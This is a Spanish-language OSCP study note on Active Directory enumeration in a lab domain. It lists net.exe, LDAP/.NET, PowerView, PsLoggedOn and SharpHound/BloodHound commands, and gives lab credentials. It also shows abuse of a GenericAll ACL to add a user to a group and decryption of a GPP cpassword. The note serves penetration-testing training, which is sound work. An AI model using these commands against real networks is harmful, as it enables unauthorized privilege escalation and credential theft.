---
tipo: modulo
modulo: 22
estado: repasado
tags:
  - oscp
  - ad
  - enumeracion
  - windows
fecha: 2026-10-06
---

# 22 - Active Directory Introduction and Enumeration

> [!abstract] Resumen
> Primer módulo de AD: **enumerar** el dominio `corp.com` desde un **assumed breach** (tenemos al usuario de bajo privilegio `stephanie`, con RDP a CLIENT75). La info recogida alimenta los ataques de los módulos siguientes (AD authentication / lateral movement).
> - **22.1 Teoría**: objetos (users/groups/computers), OUs, **Domain Controller**, grupos clave (**Domain Admins**, **Enterprise Admins**), forest/tree, dependencia de **DNS** y **LDAP**.
> - **22.2 Enum manual**: herramientas legacy (**net.exe**), script propio con **PowerShell + .NET + ADSI** (LDAP path `LDAP://PDC/DN`, `DirectoryEntry`/`DirectorySearcher`, filtro `samAccountType`), y **PowerView** (`Get-NetUser`, `Get-NetGroup`...).
> - **22.3 Ampliar**: SO (`Get-NetComputer`), acceso admin local (`Find-LocalAdminAccess`), sesiones (`Get-NetSession`/**PsLoggedOn**), **SPNs** (`setspn`, `Get-NetUser -SPN`), **permisos/ACLs** (`Get-ObjectAcl`, `Convert-SidToName`, abuso de **GenericAll**) y **shares** (`Find-DomainShare`, GPP `cpassword` → `gpp-decrypt`).
> - **22.4 Enum automática**: **SharpHound** (recolecta) → **BloodHound**/Neo4j (grafos, **Shortest Path to Domain Admins**, **owned principals**).
> Idea clave del examen: la enumeración es un **"rinse and repeat"** desde cada usuario/host nuevo. No apuntes solo a Domain Admin: cuentas de servicio, shares y permisos mal configurados dan el camino. Usa **RDP** (no WinRM) para evitar el **Kerberos double-hop**.

## Conceptos clave
- **Objeto AD**: user, group, computer... con **atributos** (samaccountname, memberof, pwdlastset...). Las OUs son contenedores (como carpetas).
- **Domain Controller (DC)**: núcleo del dominio, aloja OUs/objetos y normalmente el **DNS** autoritativo. El **PDC** (PdcRoleOwner) tiene la info más actualizada → apúntale al enumerar.
- **Grupos clave**: **Domain Admins** (control total del dominio), **Enterprise Admins** (control de todo el **forest**). Un dominio puede formar **tree**/**forest**.
- **LDAP + ADSI**: AD se consulta por **LDAP**. `ADSI` (COM) como proveedor LDAP. Path: `LDAP://HostName[:Port][/DistinguishedName]`.
- **Distinguished Name (DN)**: identifica único un objeto. Se lee **de derecha a izquierda**: `CN=Stephanie,CN=Users,DC=corp,DC=com` (CN=Common Name, DC=Domain Component).
- **samAccountType**: atributo en users/computers/groups. `805306368` (0x30000000) = cuentas de usuario normales.
- **SPN (Service Principal Name)**: asocia un servicio a una **service account** en AD. Enumerar SPNs revela IP/puerto de apps (IIS/MSSQL/Exchange) sin escanear. Base del Kerberoasting (módulos siguientes).
- **ACL/ACE**: una ACL es lista de ACEs (permisos allow/deny) sobre un objeto. Permisos jugosos: **GenericAll** (todo), **GenericWrite**, **WriteOwner**, **WriteDACL**, **AllExtendedRights**, **ForceChangePassword**, **Self**.
- **Nested groups**: grupos dentro de grupos → herencia de permisos. `net.exe` NO los muestra (solo lista usuarios), por eso el script LDAP/PowerView ve más.
- **GPP cpassword**: credenciales en Group Policy Preferences (SYSVOL) cifradas con AES-256 cuya **clave privada es pública** → `gpp-decrypt`.
- **BloodHound/SharpHound**: SharpHound recolecta (C#/PS, usa NetSessionEnum/LDAP/Remote Registry); BloodHound (Neo4j) grafica relaciones y calcula **shortest paths**.

> [!tip] Idea para el examen
> **RDP, no WinRM/PS-Remoting** con credenciales de dominio: evitas el **Kerberos double-hop** (perderías la posibilidad de usar herramientas de enum contra otros hosts). `net.exe` es rápido pero **ciego a nested groups y atributos** → combina con PowerView. `Find-LocalAdminAccess` = spray de acceso admin local con tu usuario actual. `Get-NetSession` suele fallar en Win10 1709+/Server 2019+ (permisos del registro) → usa **PsLoggedOn** (necesita Remote Registry). SharpHound hace **ruido** → úsalo cuando el escenario lo permita. En los Challenge Labs el objetivo sí es **Domain Admin**.

---

## 22.1 Introducción y objetivos
Escenario **assumed breach**: credenciales de `stephanie` (`LegmanTeamBenzoin!!`), con RDP a CLIENT75, **sin** ser admin local. Objetivo: enumerar todo `corp.com` y buscar caminos a **Domain Admin**. Clave: **repetir la enumeración** desde cada nuevo usuario/host (pivot de perspectiva).
```bash
xfreerdp /u:stephanie /d:corp.com /v:192.168.50.75    # conectar por RDP (recomendado vs WinRM)
```

---

## 22.2 Enumeración manual

### Legacy: net.exe
```powershell
net user /domain                       # usuarios del dominio
net user jeffadmin /domain             # detalle de un usuario (grupos -> *Domain Admins)
net group /domain                      # grupos del dominio
net group "Sales Department" /domain    # miembros de un grupo (OJO: no ve nested groups)
```

### Script propio: PowerShell + .NET + ADSI (LDAP)
Ver nota → [[Enumeracion AD con LDAP y .NET]]. Construye el path LDAP y busca.
```powershell
# path LDAP dinámico
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN  = ([adsi]'').distinguishedName        # DC=corp,DC=com
$LDAP = "LDAP://$PDC/$DN"
# buscar
$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"   # solo usuarios
$dirsearcher.FindAll()
```
Convertido en función reutilizable (`LDAPSearch`):
```powershell
powershell -ep bypass ; Import-Module .\function.ps1
LDAPSearch -LDAPQuery "(samAccountType=805306368)"       # usuarios
LDAPSearch -LDAPQuery "(objectclass=group)"              # grupos (incl. domain local)
$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
$sales.properties.member                                 # revela nested groups
```

### PowerView
Ver nota → [[PowerView]].
```powershell
Import-Module .\PowerView.ps1
Get-NetDomain                                   # info del dominio (como GetCurrentDomain)
Get-NetUser | select cn,pwdlastset,lastlogon    # usuarios + atributos (dormant/weak)
Get-NetGroup | select cn
Get-NetGroup "Sales Department" | select member
```

---

## 22.3 Ampliando el repertorio

### Sistemas operativos y acceso admin local
```powershell
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
Find-LocalAdminAccess       # ¿en qué equipos es admin local nuestro usuario? (-> CLIENT74)
```

### Sesiones / usuarios logueados
```powershell
Get-NetSession -ComputerName files04 -Verbose    # suele dar "Access denied" en Win moderno
# Get-Acl HKLM:...\LanmanServer\DefaultSecurity   (el registro bloquea NetSessionEnum remoto)
.\PsLoggedon.exe \\client74      # Sysinternals: usa HKEY_USERS + NetSessionEnum (Remote Registry)
# -> jeffadmin (Domain Admin) con sesión en CLIENT74, donde stephanie es admin local = camino!
```

### SPNs (service accounts)
```powershell
setspn -L iis_service                                   # SPNs de un usuario
Get-NetUser -SPN | select samaccountname,serviceprincipalname   # todos los SPN
nslookup.exe web04.corp.com
```

### Permisos / ACLs (abuso de GenericAll)
```powershell
Get-ObjectAcl -Identity stephanie       # ACEs sobre un objeto (ActiveDirectoryRights, SecurityIdentifier)
Convert-SidToName S-1-5-21-...-1104      # SID -> nombre
# ¿quién tiene GenericAll sobre un grupo?
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
# abuso: stephanie tiene GenericAll sobre Management Department -> auto-añadirse
net group "Management Department" stephanie /add /domain
net group "Management Department" stephanie /del /domain    # limpiar!
```

### Shares de dominio (GPP cpassword)
```powershell
Find-DomainShare                        # (-CheckShareAccess = solo accesibles)
ls \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\
cat ...\old-policy-backup.xml           # busca cpassword="..."
```
```bash
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"   # -> P@$$w0rd (clave AES pública)
```
Otros shares pueden tener credenciales en claro (p.ej. `start-email.txt` con un password) → documenta todo para wordlists/password spraying.

---

## 22.4 Enumeración automática — SharpHound + BloodHound
Ver nota → [[BloodHound]].
```powershell
# recolección en el host de dominio (Windows)
powershell -ep bypass ; Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
# genera un .zip con los JSON (el .bin es caché, se puede borrar)
```
```bash
# análisis en Kali
sudo neo4j start                 # http://localhost:7474 (login neo4j/neo4j, cambiar password)
bloodhound                       # cargar el .zip (Upload Data)
```
En BloodHound: **Analysis** → *Find all Domain Admins*, *Find Shortest Paths to Domain Admins*, y tras marcar objetos (**Mark User/Computer as Owned**, icono calavera) → *Shortest Paths to Domain Admins from Owned Principals*. Las aristas (`AdminTo`, `MemberOf`, `HasSession`...) describen la relación; la pestaña **Abuse/Opsec** del `? Help` explica cómo explotarla.

Camino descubierto: `stephanie` (sesión en CLIENT75) → admin en **CLIENT74** donde **jeffadmin** (Domain Admin) tiene sesión → robar sus credenciales = Domain Admin.

---

## Comandos
```powershell
# net.exe
net user /domain ; net user <u> /domain ; net group /domain ; net group "<grupo>" /domain

# PowerView (Import-Module .\PowerView.ps1)
Get-NetDomain ; Get-NetUser | select cn,pwdlastset,lastlogon ; Get-NetGroup "<g>" | select member
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
Find-LocalAdminAccess ; Get-NetSession -ComputerName <host> -Verbose
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Get-ObjectAcl -Identity "<obj>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
Convert-SidToName <SID> ; Find-DomainShare -CheckShareAccess

# Legacy / Sysinternals
setspn -L <user> ; .\PsLoggedon.exe \\<host>

# BloodHound
Import-Module .\Sharphound.ps1 ; Invoke-BloodHound -CollectionMethod All -OutputDirectory . -OutputPrefix audit
sudo neo4j start ; bloodhound ; gpp-decrypt "<cpassword>"
```
| Comando | Qué hace |
|---|---|
| `net user /domain` | Usuarios del dominio (rápido, ciego a nested/atributos) |
| `LDAPSearch -LDAPQuery "(...)"` | Consulta LDAP cruda vía .NET/ADSI |
| `Get-NetUser -SPN` | Cuentas con SPN (service accounts) |
| `Find-LocalAdminAccess` | ¿Dónde soy admin local? |
| `PsLoggedon \\host` | Usuarios logueados (Remote Registry) |
| `Get-ObjectAcl` + `Convert-SidToName` | ACEs sobre un objeto + resolver SIDs |
| `Find-DomainShare` | Shares del dominio |
| `gpp-decrypt` | Descifrar cpassword de GPP (SYSVOL) |
| `Invoke-BloodHound -CollectionMethod All` | Recolección con SharpHound |

> [!warning] Errores comunes / cosas que fallan
> - Conectar con **WinRM/PS-Remoting** → **Kerberos double-hop**: no podrás enumerar otros hosts. Usa **RDP**.
> - `net.exe` no ve **nested groups** ni atributos → usa LDAP/PowerView.
> - `Get-NetSession` falla ("Access denied") en Windows moderno → **PsLoggedOn** (necesita Remote Registry activo).
> - Olvidar **limpiar** tras abusar de GenericAll (`net group ... /del`).
> - SharpHound/BloodHound generan **mucho ruido** de red.
> - PowerView/SharpHound: `powershell -ep bypass` + `Import-Module` para cargarlos.

## Ejemplo práctico
> [!example] Flujo de enumeración
> 1. RDP como `stephanie` → `net user /domain`, `Get-NetUser`/`Get-NetGroup` (detectar `jeffadmin` en Domain Admins, nested groups).
> 2. `Get-NetComputer` (SO/hosts), `Find-LocalAdminAccess` → admin local en **CLIENT74**.
> 3. `PsLoggedon \\client74` → **jeffadmin** (Domain Admin) tiene sesión ahí → camino a DA.
> 4. `Get-NetUser -SPN` (iis_service), `Get-ObjectAcl` (GenericAll de stephanie), `Find-DomainShare` → GPP `cpassword` (`gpp-decrypt`) y password en claro en un share.
> 5. SharpHound → BloodHound → *Shortest Path to DA from Owned Principals* confirma: CLIENT75 → CLIENT74 → jeffadmin → Domain Admins.

## Relacionado
- Técnicas: [[PowerView]] · [[BloodHound]] · [[Enumeracion AD con LDAP y .NET]] · [[SMB Enumeration]]
- Cheatsheet: [[Active Directory]]
- Módulo previo: [[21 - The Metasploit Framework]]
- Máquinas donde lo usé: [[]]

## Dudas
> [!question]
> - Repasar **Kerberos double-hop** a fondo (por qué RDP sí y WinRM no).
> - Lista completa de permisos ACL explotables y su vía de abuso (GenericWrite, WriteDACL, WriteOwner...). Se ven en módulos siguientes.
> - BloodHound: queries pre-hechas más útiles para el examen además de los shortest paths.
